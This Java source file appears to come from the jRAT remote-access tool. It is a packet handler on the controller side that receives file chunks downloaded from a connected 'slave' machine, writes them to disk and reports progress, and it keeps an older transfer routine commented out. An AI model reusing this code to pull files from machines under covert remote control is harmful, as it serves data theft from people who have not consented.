package se.jrat.client.packets.incoming;

import java.io.DataInputStream;
import java.io.File;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.FrameFileTransfer;
import se.jrat.client.ui.frames.FrameRemoteFiles;
import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;


public class Packet29ServerDownloadPart extends AbstractIncomingPacket {

	@Override
	public void read(final Slave slave, DataInputStream dis) throws Exception {
		final String remotePath = slave.readLine();

		final FrameFileTransfer frame = FrameFileTransfer.instance;
		final FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);

		if (frame2 != null) {
			frame2.start();
		}

		TransferData localData = FileCache.get(slave);

		File output = localData.local;

		if (output.isDirectory()) {
			output = new File(output, remotePath.substring(remotePath.lastIndexOf(slave.getFileSeparator()) + 1, remotePath.length()));
		}
		
		TransferData data = FileCache.get(slave);
		
		byte[] buffer = new byte[dis.readInt()];
		dis.readFully(buffer);
		data.getOutputStream().write(buffer);
		data.increaseRead(buffer.length);
		int bytesSent = data.read;
		int totalBytes = (int) data.total;
		frame.reportProgress(remotePath, (int) ((float) bytesSent / (float) totalBytes * 100.0F), (int) bytesSent, (int) totalBytes);

		/*try {
			FileIO fileio = new FileIO();
			fileio.readFile(output, slave.getSocket(), slave.getDataInputStream(), slave.getDataOutputStream(), new TransferListener() {
				@Override
				public void transferred(long sent, long bytesSent, long totalBytes) {
					int progress = (int) ((float) bytesSent / (float) totalBytes * 100.0F);

					if (frame != null) {
						frame.reportProgress(remotePath, progress, (int) bytesSent, (int) totalBytes);
					}
					if (frame2 != null) {
						frame2.reportProgress(remotePath, progress, (int) bytesSent, (int) totalBytes);
					}
				}
			}, slave.getKey());

			if (frame != null) {
				frame.done(remotePath, output.length() + "");
			}

			if (frame2 != null) {
				frame2.done();
			}

			new Thread("Transfer notify") {
				@Override
				public void run() {
					if (localData.getRemoteFiles().size() > 0) {
						try {
							Thread.sleep(100L);
						} catch (Exception e) {
							e.printStackTrace();
						}
						String f = localData.getRemoteFiles().get(0);
						localData.getRemoteFiles().remove(0);
						slave.addToSendQueue(new Packet21ServerDownloadFile(f));
					} else {
						data.remove(localData);
						JOptionPane.showMessageDialog(null, "All file transfers were done successfully.", "Success", JOptionPane.INFORMATION_MESSAGE);

						if (frame != null) {
							frame.reset();
						}
					}
				}
			}.start();
		} catch (Exception e) {
			e.printStackTrace();
		}*/
	}

}
